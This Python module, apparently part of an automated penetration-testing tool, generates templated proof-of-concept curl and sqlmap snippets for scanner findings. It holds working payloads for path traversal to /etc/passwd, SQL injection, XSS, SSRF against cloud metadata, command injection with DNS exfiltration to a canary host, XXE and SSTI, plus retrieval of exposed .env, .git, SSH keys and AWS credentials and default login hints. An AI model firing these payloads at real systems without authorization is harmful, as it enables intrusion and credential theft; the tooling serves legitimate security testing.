"""Deterministic Proof-of-Concept generator.

Emits ready-to-paste curl/sqlmap/manual-verification snippets for the most
common finding kinds. Runs without an LLM so even an offline session
produces actionable PoCs in the report.

Design:

1. **Pure functions, no side effects.** Each generator takes a
   `Finding` plus a small context dict and returns a markdown string.
   The reporter calls `build_poc(finding, ctx)` once per finding.

2. **Severity gate.** Only findings at or above `confidence >= 0.5` and
   `severity in {medium, high, critical}` get a PoC. Info-level
   fingerprint output isn't worth a curl command.

3. **Safety-first.** Every PoC is *passive verification* by default —
   `curl -sI`, `--read-only`, `--batch`. Aggressive payloads (sqlmap
   `--risk=3`, RCE oneliners) only appear when the finding's
   `exploitable` heuristic is set or the kind explicitly maps to one.

4. **Deterministic, not creative.** Templated strings only — no LLM,
   no regex creativity. If we don't have a matching template the
   function returns "" and the reporter falls back to its existing
   recommendation prose.

5. **Caller composes.** Returns markdown, not a structured payload —
   the reporter renders it directly under each finding. The renderer
   doesn't need to know the shape.
"""
from __future__ import annotations

from typing import Any


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _target(ctx: dict[str, Any]) -> str:
    """Best-effort target URL/host string for the curl examples."""
    wa = ctx.get("webapp") or {}
    if wa.get("base_url"):
        return str(wa["base_url"]).rstrip("/")
    h = ctx.get("host") or {}
    return str(h.get("hostname") or h.get("ip") or "TARGET")


def _endpoint_path(ctx: dict[str, Any]) -> str:
    e = ctx.get("endpoint") or {}
    p = str(e.get("path") or "/").strip()
    if not p.startswith("/"):
        p = "/" + p
    return p


def _wrap(title: str, snippet: str, *, lang: str = "bash", note: str = "") -> str:
    """Standardize the markdown shape: heading + fenced code + optional note."""
    out = [f"**{title}**", "", f"```{lang}", snippet.strip(), "```"]
    if note:
        out.extend(["", note.strip()])
    return "\n".join(out) + "\n"


# ---------------------------------------------------------------------------
# Per-class generators
# ---------------------------------------------------------------------------

def _poc_panel(f: dict[str, Any], ctx: dict[str, Any]) -> str:
    target = _target(ctx)
    tid = (f.get("template_id") or f.get("kind") or "").lower()
    creds_hint = ""
    if "flowise" in tid:
        creds_hint = "Default credentials: admin / admin (Flowise pre-1.4)"
        path = "/api/v1/chatflows"
    elif "grafana" in tid:
        creds_hint = "Default credentials: admin / admin"
        path = "/api/admin/users"
    elif "kibana" in tid:
        creds_hint = "Check Kibana < 7.7 for prototype-pollution RCE (CVE-2019-7609)"
        path = "/api/console/proxy?path=_cluster/health&method=GET"
    elif "jenkins" in tid:
        creds_hint = "Try anonymous read; default admin/admin or jenkins/jenkins"
        path = "/script"  # Groovy script console = RCE if reachable
    elif "phpmyadmin" in tid:
        creds_hint = "Default credentials: root / (blank), phpmyadmin / (blank)"
        path = "/index.php"
    elif "wp-login" in tid or "wordpress" in tid:
        creds_hint = "wp-login.php — try /wp-json/wp/v2/users for user enumeration"
        path = "/wp-login.php"
    elif "portainer" in tid:
        creds_hint = "Initial admin setup race condition (CVE-2018-19466) on unprovisioned instances"
        path = "/api/users/admin/init"
    else:
        path = "/login"
    return _wrap(
        "Manual verification (panel reachability)",
        f"curl -sk -i {target}{path}\n"
        f"# 200 / 302 / 401 confirms panel is live",
        note=creds_hint,
    )


def _poc_exposed_vcs(f: dict[str, Any], ctx: dict[str, Any]) -> str:
    target = _target(ctx)
    tid = (f.get("template_id") or f.get("kind") or "").lower()
    if "git" in tid:
        path, what = "/.git/config", ".git/config (full repo via dvcs-ripper / git-dumper)"
    elif "env" in tid:
        path, what = "/.env", ".env file with API keys / DB credentials"
    elif "backup" in tid:
        path, what = "/backup.sql", "SQL backup with credentials/PII"
    elif "private-key" in tid:
        path, what = "/id_rsa", "private SSH key — credentialed access vector"
    elif "aws-credentials" in tid:
        path, what = "/.aws/credentials", "AWS access keys"
    else:
        path, what = "/", "exposed sensitive file"
    return _wrap(
        f"Confirm exposure ({what})",
        f"curl -sk -o /tmp/leaked {target}{path}\n"
        f"# Then inspect: head -50 /tmp/leaked",
        note=(
            "If `.git/config` is reachable, recover the repo:\n"
            f"  git-dumper {target}/ ./recovered\n"
            "and grep for secrets/credentials/IAM keys."
            if "git" in tid else
            "Treat any exposed credentials as already-compromised — rotate immediately."
        ),
    )


def _poc_cve(f: dict[str, Any], ctx: dict[str, Any]) -> str:
    target = _target(ctx)
    tid = (f.get("template_id") or "").upper()
    refs = f.get("references") or []
    snippet = (
        f"# Re-confirm with nuclei single-template:\n"
        f"nuclei -id {tid} -u {target} -severity high,critical\n\n"
        f"# Or hit the public PoC (review before running):\n"
        f"# searchsploit -m {tid}\n"
        f"# https://nvd.nist.gov/vuln/detail/{tid}"
    )
    note = ""
    if refs:
        note = "References:\n" + "\n".join(f"- {r}" for r in refs[:5])
    return _wrap(f"PoC for {tid}", snippet, note=note)


def _poc_lfi(f: dict[str, Any], ctx: dict[str, Any]) -> str:
    target = _target(ctx)
    path = _endpoint_path(ctx)
    params = ctx.get("parameters") or []
    pname = (params[0].get("name") if params else None) or "file"
    return _wrap(
        "LFI verification (path traversal)",
        f"# Linux:\n"
        f"curl -sk '{target}{path}?{pname}=../../../../etc/passwd'\n"
        f"# Windows:\n"
        f"curl -sk '{target}{path}?{pname}=..%5C..%5C..%5Cwindows%5Cwin.ini'\n"
        f"# PHP filter chain (read source):\n"
        f"curl -sk '{target}{path}?{pname}=php://filter/read=convert.base64-encode/resource=index'",
        note="Look for root:x:0:0, [extensions], or base64 PHP source in the response.",
    )


def _poc_sqli(f: dict[str, Any], ctx: dict[str, Any]) -> str:
    target = _target(ctx)
    path = _endpoint_path(ctx)
    params = ctx.get("parameters") or []
    pname = (params[0].get("name") if params else None) or "id"
    return _wrap(
        "SQLi verification (boolean / time-based)",
        f"# Boolean diff (compare response sizes):\n"
        f"curl -sk '{target}{path}?{pname}=1%20AND%201=1' | wc -c\n"
        f"curl -sk '{target}{path}?{pname}=1%20AND%201=2' | wc -c\n\n"
        f"# Time-based (5s delay if vulnerable):\n"
        f"time curl -sk '{target}{path}?{pname}=1%27%20AND%20SLEEP(5)--' >/dev/null\n\n"
        f"# Then automate (safe-mode):\n"
        f"sqlmap -u '{target}{path}?{pname}=1' --batch --level=2 --risk=1 --random-agent",
        note="Compare response sizes; identical = no boolean signal. >5s delay confirms time-based.",
    )


def _poc_xss(f: dict[str, Any], ctx: dict[str, Any]) -> str:
    target = _target(ctx)
    path = _endpoint_path(ctx)
    params = ctx.get("parameters") or []
    pname = (params[0].get("name") if params else None) or "q"
    return _wrap(
        "Reflected XSS verification",
        f"# Reflection probe:\n"
        f"curl -sk '{target}{path}?{pname}=PENTAGENT_XSS_PROBE_42' | grep -c PENTAGENT_XSS_PROBE_42\n\n"
        f"# Tag-context payload:\n"
        f"curl -sk \"{target}{path}?{pname}=<svg/onload=alert(1)>\" | grep -F '<svg/onload'",
        note="A grep hit on the unencoded payload confirms the parameter is reflected without escaping.",
    )


def _poc_ssrf(f: dict[str, Any], ctx: dict[str, Any]) -> str:
    target = _target(ctx)
    path = _endpoint_path(ctx)
    params = ctx.get("parameters") or []
    pname = (params[0].get("name") if params else None) or "url"
    return _wrap(
        "SSRF verification (cloud metadata + DNS canary)",
        f"# AWS IMDSv1 (works on hosts without IMDSv2 enforced):\n"
        f"curl -sk '{target}{path}?{pname}=http://169.254.169.254/latest/meta-data/'\n\n"
        f"# Out-of-band canary (replace with your collaborator URL):\n"
        f"curl -sk '{target}{path}?{pname}=http://<your-id>.oastify.com/'\n\n"
        f"# GCP metadata:\n"
        f"curl -sk '{target}{path}?{pname}=http://metadata.google.internal/computeMetadata/v1/' "
        f"-H 'Metadata-Flavor: Google'",
        note="Use Burp Collaborator / interactsh for blind SSRF if metadata endpoints don't surface.",
    )


def _poc_rce(f: dict[str, Any], ctx: dict[str, Any]) -> str:
    target = _target(ctx)
    path = _endpoint_path(ctx)
    params = ctx.get("parameters") or []
    pname = (params[0].get("name") if params else None) or "cmd"
    return _wrap(
        "Command injection / RCE verification",
        f"# Time-based (sleep 5s):\n"
        f"time curl -sk '{target}{path}?{pname}=;sleep%205' >/dev/null\n\n"
        f"# Out-of-band DNS exfil (replace with your canary):\n"
        f"curl -sk '{target}{path}?{pname}=;nslookup%20pentagent-rce-probe.<your-id>.oastify.com'\n\n"
        f"# Reflected output — `id` and `whoami`:\n"
        f"curl -sk '{target}{path}?{pname}=;id'",
        note=(
            "**STOP IMMEDIATELY** if a sleep delay or DNS hit confirms RCE. "
            "Document the PoC, do **not** escalate without explicit scope authorization."
        ),
    )


def _poc_open_redirect(f: dict[str, Any], ctx: dict[str, Any]) -> str:
    target = _target(ctx)
    path = _endpoint_path(ctx)
    params = ctx.get("parameters") or []
    pname = (params[0].get("name") if params else None) or "next"
    return _wrap(
        "Open redirect verification",
        f"curl -sk -o /dev/null -w '%{{http_code}} %{{redirect_url}}\\n' "
        f"'{target}{path}?{pname}=https://evil.example.com/'",
        note="A 30x with redirect_url under attacker-controlled host confirms the issue.",
    )


def _poc_xxe(f: dict[str, Any], ctx: dict[str, Any]) -> str:
    target = _target(ctx)
    path = _endpoint_path(ctx)
    return _wrap(
        "XXE verification (XML external entity)",
        f"curl -sk -X POST '{target}{path}' \\\n"
        f"  -H 'Content-Type: application/xml' \\\n"
        f"  --data $'<?xml version=\"1.0\"?>\\n"
        f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\\n"
        f"<foo>&xxe;</foo>'",
        note="A response containing root:x:0:0 confirms file disclosure via XXE.",
    )


def _poc_ssti(f: dict[str, Any], ctx: dict[str, Any]) -> str:
    target = _target(ctx)
    path = _endpoint_path(ctx)
    params = ctx.get("parameters") or []
    pname = (params[0].get("name") if params else None) or "name"
    return _wrap(
        "SSTI verification (template injection)",
        f"# Jinja2/Twig probe — `{{7*7}}` should render as 49:\n"
        f"curl -sk '{target}{path}?{pname}={{{{7*7}}}}'\n\n"
        f"# ERB/Ruby probe:\n"
        f"curl -sk '{target}{path}?{pname}=<%=7*7%>'\n\n"
        f"# Thymeleaf probe:\n"
        f"curl -sk '{target}{path}?{pname}=__$%7B%227%22*7%7D__'",
        note="Look for the literal `49` (or `2401` for 7**4) in the response body.",
    )


def _poc_default(f: dict[str, Any], ctx: dict[str, Any]) -> str:
    target = _target(ctx)
    return _wrap(
        "Manual reachability check",
        f"curl -sk -i {target}{_endpoint_path(ctx)}",
        note="Adjust headers/method based on the finding's evidence above.",
    )


# ---------------------------------------------------------------------------
# Dispatch
# ---------------------------------------------------------------------------

# Match against the tuple (kind, template_id) — first hit wins. Order matters:
# more-specific patterns first.
_DISPATCH: list[tuple[tuple[str, ...], Any]] = [
    # CVE templates
    (("cve",), _poc_cve),
    # Exposed VCS / secrets
    (("exposed-git", "git-config", "env-file", "private-key", "exposed-backup",
      "exposed-sql", "aws-credentials"), _poc_exposed_vcs),
    # Panels & default-login
    (("panel", "wp-login", "phpmyadmin", "flowise", "grafana", "kibana",
      "jenkins", "portainer", "rabbitmq", "kubernetes", "gitlab"), _poc_panel),
    # Web vuln classes
    (("lfi", "file-inclusion", "path-traversal"), _poc_lfi),
    (("sqli", "sql-injection"), _poc_sqli),
    (("xss",), _poc_xss),
    (("ssrf",), _poc_ssrf),
    (("rce", "command-injection", "code-injection", "cmd-injection"), _poc_rce),
    (("xxe",), _poc_xxe),
    (("ssti", "template-injection"), _poc_ssti),
    (("open-redirect", "redirect"), _poc_open_redirect),
]


def build_poc(finding: dict[str, Any], context: dict[str, Any]) -> str:
    """Return a markdown PoC snippet, or "" if no template matches.

    `finding` is the dict shape used by the reporter (kind, template_id,
    severity, confidence, references, ...). `context` mirrors the
    `_finding_context` output (webapp, host, endpoint, parameters,
    evidence).

    Findings below `confidence=0.5` or below `medium` severity return
    "" — those are noise/fingerprint events not worth a PoC.
    """
    sev = (finding.get("severity") or "").lower()
    if sev not in ("medium", "high", "critical"):
        return ""
    conf = finding.get("confidence") or 0.0
    try:
        if float(conf) < 0.5:
            return ""
    except (TypeError, ValueError):
        return ""

    sig = " ".join(
        str(finding.get(k) or "").lower()
        for k in ("template_id", "kind", "title")
    )

    for needles, factory in _DISPATCH:
        if any(n in sig for n in needles):
            return factory(finding, context)

    return _poc_default(finding, context)


__all__ = ["build_poc"]
